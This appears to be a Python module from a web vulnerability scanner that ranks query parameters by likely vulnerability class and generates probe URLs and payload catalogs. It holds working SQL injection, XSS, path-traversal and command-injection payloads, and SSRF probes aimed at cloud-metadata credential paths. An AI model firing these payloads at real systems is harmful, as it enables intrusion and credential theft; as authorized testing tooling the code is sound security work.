"""
Parameter intelligence: classify observed/candidate query-parameter names
into the vulnerability families they're high-signal indicators for, prioritize
them per family, and generate family-targeted probe URLs.

Problem this fixes: the scanner already discovers real target URLs and real
parameters, but payload selection was too generic — it didn't use the
parameter NAME to pick better payload families, and probe generation could
degrade to root-only `/?param=...` guesses instead of mutating the real
observed parameter on its real path.

Source data: OWASP's Top-25 parameter lists per vulnerability class (XSS,
SSRF, LFI, SQLi, RCE, open redirect), taken verbatim from the reference list
supplied for this work — including its whitespace-mangled entries (PDF-
extraction artifacts like "?down load=") and its path-pattern entries
("/login?to=", "/out/", ...) that are route shapes, not parameter names.
Using the raw, imperfect source (rather than a hand-cleaned duplicate) means
the normalizer below is proven against the actual malformed input it has to
survive, not a tidier stand-in that could silently drift from it.

A small set of application-context additions are layered on top, each tied
to an explicit requirement rather than invented: productId/postId/orderId/
userId/account_id as IDOR+SQLi candidates, searchTerm/category for XSS,
stockApi for SSRF, and `to` for open redirect (the query name embedded in
the raw `/login?to=` sink pattern, and named explicitly in the requested
open-redirect priority order).

Pure and deterministic — no I/O, no network, no DB — so every function here
is directly unit-testable. This module only classifies parameters and
generates candidate probe URLs; it does not fire requests or capture
evidence. Its output feeds into the offensive engine's existing probe
functions (test_sqli, test_xss, test_ssrf, test_open_redirect,
test_path_traversal, ...), which already call add_finding()/capture() for
every positive hit — so evidence capture is inherited automatically, not
reimplemented here.
"""
import re
from urllib.parse import urlparse, parse_qs, parse_qsl, urlencode, urlunparse

FAMILIES = ("xss", "ssrf", "lfi", "sqli", "rce", "open_redirect")

_FAMILY_LOG_LABEL = {
    "xss": "XSS", "ssrf": "SSRF", "lfi": "LFI", "sqli": "SQLi",
    "rce": "RCE", "open_redirect": "Open-redirect",
}

# ---------------------------------------------------------------------------
# Source data — OWASP Top-25 parameter lists, exactly as supplied (including
# malformed/whitespace-mangled entries and path-pattern entries).
# ---------------------------------------------------------------------------
_RAW_XSS = [
    "q", "s", "search", "id", "lang", "keyword", "query", "? page=",
    "keywords", "year", "view", "email", "type", "name", "p", "month",
    "? image=", "list_type", "url", "terms", "categoryid", "key", "login",
    "begindate", "enddate",
]
_RAW_SSRF = [
    "dest", "redirect", "uri", "path", "continue", "url", "window", "next",
    "data", "reference", "site", "html", "val", "validate", "domain",
    "callback", "return", "? page=", "feed", "host", "port", "to", "out",
    "view", "dir",
]
_RAW_LFI = [
    "cat", "dir", "action", "board", "date", "detail", "file", "?down load=",
    "path", "folder", "prefix", "include", "page", "inc", "locate", "? show=",
    "doc", "site", "type", "view", "content", "document", "layout", "mod",
    "conf",
]
_RAW_SQLI = [
    "id", "page", "dir", "search", "category", "file", "class", "url",
    "news", "item", "menu", "lang", "name", "ref", "title", "view", "topic",
    "thread", "type", "date", "form", "join", "main", "nav", "region",
]
_RAW_RCE = [
    "cmd", "exec", "command", "execute", "ping", "query", "? j ump=", "code",
    "reg", "do", "func", "arg", "option", "load", "process", "step", "read",
    "function", "reg", "feature", "exe", "module", "payload", "run", "print",
]
_RAW_OPEN_REDIRECT = [
    "next", "url", "target", "rurl", "dest", "destination", "redir",
    "redirect_url", "redirect_uri", "redirect", "?redirect/",
    "?cgi-bin/redirect.cgi?", "/out/", "/out?", "view", "/login?to=",
    "image_url", "go", "return", "return_to", "checkout_url", "continue",
]

# Application-context additions (see module docstring for the rationale
# behind each).
_EXTRA_SQLI_IDOR = frozenset({"productid", "postid", "orderid", "userid", "account_id"})
_EXTRA_XSS = frozenset({"searchterm", "category"})
_EXTRA_SSRF = frozenset({"stockapi"})
_EXTRA_OPEN_REDIRECT = frozenset({"to"})

# Explicit priority orderings (the highest-signal names per family, in the
# order requested) — prioritize_params() shows these first for that family,
# ahead of anything else observed/seeded.
_PRIORITY_ORDER = {
    "sqli": ["id", "page", "search", "category", "file", "ref",
             "productid", "postid", "orderid", "userid", "account_id"],
    "xss": ["q", "s", "search", "searchterm", "category", "name", "email", "query"],
    "ssrf": ["url", "uri", "dest", "redirect", "next", "return", "callback",
             "stockapi", "path", "to"],
    "lfi": ["file", "path", "dir", "page", "include", "doc", "conf"],
    "rce": ["cmd", "exec", "command", "run", "ping", "query", "print"],
    "open_redirect": ["redirect", "next", "url", "return", "to"],
}


def is_path_pattern(raw: str) -> bool:
    """True when a source entry describes a route/path shape rather than a
    bare query-parameter name. No real parameter name (bare like "q", or
    "?name=" / whitespace-mangled like "?down load=") ever contains a '/' —
    the open-redirect path-pattern entries ("?redirect/",
    "?cgi-bin/redirect.cgi?", "/out/", "/out?", "/login?to=") all do."""
    return "/" in str(raw or "")


def normalize_param_name(raw: str) -> str:
    """Clean a pasted/extracted parameter token down to a bare lowercase
    name: strips a leading '?' and trailing '=', then removes ALL whitespace
    (not just leading/trailing), since PDF-extraction artifacts split a
    single name across internal spaces — e.g. '?down load=' -> 'download',
    '? j ump=' -> 'jump'. Not meant to be called on a path-pattern entry
    (see is_path_pattern); callers should route those separately."""
    if not raw:
        return ""
    t = str(raw).strip()
    if t.startswith("?"):
        t = t[1:]
    if t.endswith("="):
        t = t[:-1]
    t = re.sub(r"\s+", "", t)
    return t.lower()


def _clean_path_pattern(raw: str) -> str:
    """Strip the leading '?' and a trailing '?'/'=' from a path-pattern
    entry, keeping internal '/' and '?' intact, so it matches as a plain
    substring of a real URL (e.g. '?cgi-bin/redirect.cgi?' ->
    'cgi-bin/redirect.cgi', which is what actually appears in
    '.../cgi-bin/redirect.cgi?url=...')."""
    t = str(raw or "").strip()
    if t.startswith("?"):
        t = t[1:]
    if t.endswith(("?", "=")):
        t = t[:-1]
    return t.lower()


def _build_family(raw_list, extra_names=frozenset()):
    names, patterns = set(), []
    for raw in raw_list:
        if is_path_pattern(raw):
            cleaned = _clean_path_pattern(raw)
            if cleaned:
                patterns.append(cleaned)
        else:
            n = normalize_param_name(raw)
            if n:
                names.add(n)
    names |= set(extra_names)
    return frozenset(names), tuple(patterns)


XSS_PARAMS, _XSS_PATTERNS = _build_family(_RAW_XSS, _EXTRA_XSS)
SSRF_PARAMS, _SSRF_PATTERNS = _build_family(_RAW_SSRF, _EXTRA_SSRF)
LFI_PARAMS, _LFI_PATTERNS = _build_family(_RAW_LFI)
SQLI_PARAMS, _SQLI_PATTERNS = _build_family(_RAW_SQLI, _EXTRA_SQLI_IDOR)
RCE_PARAMS, _RCE_PATTERNS = _build_family(_RAW_RCE)
OPEN_REDIRECT_PARAMS, OPEN_REDIRECT_PATH_PATTERNS = _build_family(
    _RAW_OPEN_REDIRECT, _EXTRA_OPEN_REDIRECT)

# productId/postId/orderId/userId/account_id carry IDOR risk in addition to
# SQLi — a sequential/guessable ID parameter, not just an injection point.
IDOR_PARAMS = _EXTRA_SQLI_IDOR

_FAMILY_PARAMS = {
    "xss": XSS_PARAMS, "ssrf": SSRF_PARAMS, "lfi": LFI_PARAMS,
    "sqli": SQLI_PARAMS, "rce": RCE_PARAMS, "open_redirect": OPEN_REDIRECT_PARAMS,
}


def classify_param(name: str) -> set:
    """Normalize `name` and return the set of vulnerability families
    ("xss"/"ssrf"/"lfi"/"sqli"/"rce"/"open_redirect") it's a known
    high-signal candidate for. A name can belong to more than one family
    (e.g. "url" is XSS+SSRF+SQLi+open_redirect; "dir" is SSRF+LFI+SQLi) —
    that's real overlap in the source data, not a bug. Empty set if not
    recognized. productId/postId/orderId/userId/account_id also carry
    "idor" in addition to "sqli"."""
    n = normalize_param_name(name)
    if not n:
        return set()
    out = {fam for fam, params in _FAMILY_PARAMS.items() if n in params}
    if n in IDOR_PARAMS:
        out.add("idor")
    return out


def seeded_param_count() -> int:
    """Total seeded high-risk parameter slots across all families (a name
    that belongs to multiple families is counted once per family, matching
    how prioritize_params presents per-family lists)."""
    return sum(len(params) for params in _FAMILY_PARAMS.values())


def _extract_observed_param_names(urls: list) -> list:
    """Every query-parameter name observed across `urls`, normalized,
    deduped, in first-seen order."""
    seen, order = set(), []
    for u in urls or []:
        try:
            parsed = urlparse(str(u))
        except Exception:
            continue
        for key in parse_qs(parsed.query).keys():
            n = normalize_param_name(key)
            if n and n not in seen:
                seen.add(n)
                order.append(n)
    return order


def prioritize_params(urls: list) -> dict:
    """Extract every query parameter observed across `urls`, classify each,
    and return {family: [ordered param names]}: each family's list starts
    with that family's explicit high-priority names (seeded — present
    whether or not they were actually observed), then whatever else was
    observed that also classifies into that family, in first-seen order."""
    observed = _extract_observed_param_names(urls)
    observed_by_family = {fam: [] for fam in FAMILIES}
    for name in observed:
        for fam in classify_param(name):
            bucket = observed_by_family.get(fam)
            if bucket is not None and name not in bucket:
                bucket.append(name)

    out = {}
    for fam in FAMILIES:
        ordered = list(_PRIORITY_ORDER.get(fam, []))
        for name in observed_by_family[fam]:
            if name not in ordered:
                ordered.append(name)
        out[fam] = ordered
    return out


def observed_param_count(urls: list) -> int:
    return len(_extract_observed_param_names(urls))


def summary_log_line(urls: list) -> str:
    """'Parameter intelligence: N observed params + M seeded high-risk params'"""
    return (f"Parameter intelligence: {observed_param_count(urls)} observed params "
            f"+ {seeded_param_count()} seeded high-risk params")


def priority_log_line(family: str, priorities: dict, limit: int = 10) -> str:
    """'<Family> priority params: a, b, c, ...'"""
    label = _FAMILY_LOG_LABEL.get(family, family)
    names = priorities.get(family, [])
    return f"{label} priority params: {', '.join(names[:limit])}"


# ---------------------------------------------------------------------------
# Probe-URL generation — real path context preserved, never root-only.
# ---------------------------------------------------------------------------
_PROBE_MARKER = "1"


def _mutate_param(url: str, param_name: str, value: str) -> str:
    """Set `param_name` to `value` on `url`, preserving the path and every
    other query parameter exactly as-is (including their original order and
    the original casing of `param_name` if it was already present)."""
    parsed = urlparse(str(url))
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    key = param_name
    for existing, _ in pairs:
        if existing.lower() == param_name.lower():
            key = existing
            break
    replaced = False
    new_pairs = []
    for k, v in pairs:
        if k.lower() == param_name.lower() and not replaced:
            new_pairs.append((key, value))
            replaced = True
        else:
            new_pairs.append((k, v))
    if not replaced:
        new_pairs.append((key, value))
    return urlunparse(parsed._replace(query=urlencode(new_pairs)))


def _matches_open_redirect_path_pattern(url: str) -> bool:
    low = str(url or "").lower()
    return any(pattern in low for pattern in OPEN_REDIRECT_PATH_PATTERNS if pattern)


def generate_family_probe_urls(base_urls: list, observed_urls: list = None,
                               max_per_family: int = 25) -> dict:
    """Generate family-targeted probe URLs: for every real, observed
    parameter that classify_param() recognizes, mutate THAT parameter in
    place on its real path, preserving every other query parameter exactly
    as-is — never a bare root-only `/?param=...` guess when a real
    path+param context is known. Capped at `max_per_family` per family,
    with the highest-priority parameter names (per prioritize_params'
    ordering) filling the cap first.

    `base_urls` and `observed_urls` are treated as one merged pool — the
    split exists only so a caller can pass "URLs already known to be in
    scope" separately from "URLs discovered by crawling/archives" without
    pre-merging them. Returns {family: [probe_url, ...]} for the six named
    families (idor is a classify_param() tag layered on sqli parameters,
    not a separate probe-URL bucket — an IDOR-flagged id parameter still
    gets its targeted mutation through the "sqli" bucket)."""
    pool = list(dict.fromkeys(list(base_urls or []) + list(observed_urls or [])))
    priorities = prioritize_params(pool)
    priority_rank = {
        fam: {name: i for i, name in enumerate(names)}
        for fam, names in priorities.items()
    }

    per_family_hits = {fam: [] for fam in FAMILIES}
    for url in pool:
        parsed = urlparse(str(url))
        for pname in parse_qs(parsed.query).keys():
            n = normalize_param_name(pname)
            if not n:
                continue
            for fam in classify_param(n):
                if fam not in per_family_hits:
                    continue
                probe_url = _mutate_param(url, pname, _PROBE_MARKER)
                rank = priority_rank.get(fam, {}).get(n, len(priorities.get(fam, [])) + 1)
                per_family_hits[fam].append((rank, probe_url))
        if _matches_open_redirect_path_pattern(url):
            rank = priority_rank.get("open_redirect", {}).get("to", 0)
            per_family_hits["open_redirect"].append((rank, url))

    out = {}
    for fam in FAMILIES:
        ordered = []
        for _, probe_url in sorted(per_family_hits[fam], key=lambda t: t[0]):
            if probe_url not in ordered:
                ordered.append(probe_url)
            if len(ordered) >= max_per_family:
                break
        out[fam] = ordered
    return out


# ---------------------------------------------------------------------------
# Payload catalogs — real payloads by family, not just target selection.
# ---------------------------------------------------------------------------
def payloads_for_family(family: str, url: str = "", *, authorized: bool = False,
                        oast_url: str = None) -> list:
    """Return [{"type", "payload", "target", "notes"}, ...] for `family`.

    RCE payloads are withheld entirely unless authorized=True (harmless
    id/whoami/OAST-DNS-callback only — never destructive). SSRF's
    localhost/cloud-metadata fallback payloads are withheld unless
    authorized=True; the out-of-band callback payload (when oast_url is
    supplied) is always included since it only causes one outbound request
    to a listener the tester controls, never touching real target/cloud
    infrastructure."""
    target = url or ""
    if family == "sqli":
        return [
            {"type": "SQLi-error", "payload": "'", "target": target,
             "notes": "Syntax-breaker; watch for a raw DB error in the response."},
            {"type": "SQLi-error", "payload": '"', "target": target,
             "notes": "Syntax-breaker for double-quoted contexts."},
            {"type": "SQLi-boolean-true", "payload": "' OR '1'='1", "target": target,
             "notes": "Boolean-based true branch; compare against the false control below."},
            {"type": "SQLi-boolean-false", "payload": "' OR '1'='2", "target": target,
             "notes": "Boolean-based false control for differential comparison."},
            {"type": "SQLi-time-mysql", "payload": "' AND SLEEP(5)-- -", "target": target,
             "notes": "Time-delay (MySQL/MariaDB)."},
            {"type": "SQLi-time-mssql", "payload": "'; WAITFOR DELAY '0:0:5'--", "target": target,
             "notes": "Time-delay (MSSQL)."},
            {"type": "SQLi-time-postgres", "payload": "'||pg_sleep(5)--", "target": target,
             "notes": "Time-delay (PostgreSQL)."},
            {"type": "SQLi-time-oracle", "payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
             "target": target, "notes": "Time-delay (Oracle)."},
            {"type": "SQLi-union", "payload": "' UNION SELECT NULL-- -", "target": target,
             "notes": "Column-count/UNION probe; extend the NULL list until it succeeds."},
        ]
    if family == "xss":
        canary = "yggxss1"
        return [
            {"type": "XSS-reflected-canary", "payload": f"<{canary}>", "target": target,
             "notes": "Unencoded-reflection canary; confirms the value round-trips raw."},
            {"type": "XSS-attribute-breaker", "payload": f'"><svg onload={canary}(1)>',
             "target": target, "notes": "Breaks out of a double-quoted HTML attribute context."},
            {"type": "XSS-attribute-breaker", "payload": f"'><svg onload={canary}(1)>",
             "target": target, "notes": "Breaks out of a single-quoted HTML attribute context."},
            {"type": "XSS-scriptless", "payload": f"<svg onload={canary}(1)>", "target": target,
             "notes": "No <script> tag — survives naive '<script>' blacklists."},
            {"type": "XSS-scriptless", "payload": f"<img src=x onerror={canary}(1)>",
             "target": target, "notes": "Event-handler based, no <script> tag."},
            {"type": "XSS-dom-canary", "payload": f"#{canary}", "target": target,
             "notes": "Fragment-based canary for DOM sinks that read location.hash."},
            {"type": "XSS-javascript-uri", "payload": f"javascript:{canary}(1)", "target": target,
             "notes": "javascript: URI sink probe (href/src/action attributes)."},
        ]
    if family == "ssrf":
        payloads = []
        if oast_url:
            payloads.append({
                "type": "SSRF-oast-callback", "payload": oast_url, "target": target,
                "notes": "Out-of-band callback — a hit confirms server-side fetch "
                        "without touching real target/cloud infrastructure.",
            })
        if authorized:
            payloads += [
                {"type": "SSRF-metadata-aws", "payload":
                 "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                 "target": target, "notes": "AWS instance-metadata read probe (authorized/lab only)."},
                {"type": "SSRF-metadata-gcp", "payload":
                 "http://metadata.google.internal/computeMetadata/v1/", "target": target,
                 "notes": "GCP instance-metadata read probe (authorized/lab only)."},
                {"type": "SSRF-local-file", "payload": "file:///etc/passwd", "target": target,
                 "notes": "Local-file-read via the file:// scheme (authorized/lab only)."},
                {"type": "SSRF-localhost", "payload": "http://127.0.0.1:80/", "target": target,
                 "notes": "Loopback-reachability probe (authorized/lab only)."},
            ]
        return payloads
    if family == "lfi":
        depth = "../" * 6
        return [
            {"type": "LFI-traversal-linux", "payload": depth + "etc/passwd", "target": target,
             "notes": "Linux/Unix target file."},
            {"type": "LFI-traversal-windows", "payload": depth + "windows/win.ini", "target": target,
             "notes": "Windows target file."},
            {"type": "LFI-traversal-url-encoded", "payload": "..%2f" * 6 + "etc%2fpasswd",
             "target": target, "notes": "URL-encoded traversal (bypasses naive '../' filters)."},
            {"type": "LFI-traversal-double-encoded", "payload": "..%252f" * 6 + "etc%252fpasswd",
             "target": target, "notes": "Double URL-encoded traversal (bypasses decode-once filters)."},
            {"type": "LFI-null-byte", "payload": depth + "etc/passwd\x00", "target": target,
             "notes": "Legacy null-byte truncation (older PHP)."},
            {"type": "LFI-php-filter-wrapper", "payload":
             "php://filter/convert.base64-encode/resource=index", "target": target,
             "notes": "PHP filter wrapper — source disclosure without traversal."},
        ]
    if family == "rce":
        if not authorized:
            return []
        payloads = [
            {"type": "RCE-id", "payload": "; id", "target": target,
             "notes": "Harmless identity check; reflected output confirms execution."},
            {"type": "RCE-whoami", "payload": "| whoami", "target": target,
             "notes": "Harmless identity check (pipe syntax variant)."},
            {"type": "RCE-id-subshell", "payload": "$(id)", "target": target,
             "notes": "Harmless identity check (subshell syntax variant)."},
        ]
        if oast_url:
            oast_host = oast_url.split("://", 1)[-1].split("/", 1)[0]
            payloads.append({
                "type": "RCE-oast-blind", "payload": f"; nslookup {oast_host}", "target": target,
                "notes": "Blind-RCE confirmation via DNS callback — works even when "
                        "command output isn't reflected in the response.",
            })
        return payloads
    if family == "open_redirect":
        evil = "evil-yggdrasil.example"
        return [
            {"type": "OpenRedirect-absolute", "payload": f"https://{evil}", "target": target,
             "notes": "Controlled external domain; its presence in a redirect proves attacker control."},
            {"type": "OpenRedirect-protocol-relative", "payload": f"//{evil}", "target": target,
             "notes": "Protocol-relative bypass for naive 'https://' prefix checks."},
            {"type": "OpenRedirect-backslash", "payload": f"/\\{evil}", "target": target,
             "notes": "Backslash bypass — some browsers/parsers treat \\ as /."},
            {"type": "OpenRedirect-malformed-scheme", "payload": f"https:/{evil}", "target": target,
             "notes": "Single-slash malformed-scheme bypass for naive scheme checks."},
        ]
    return []
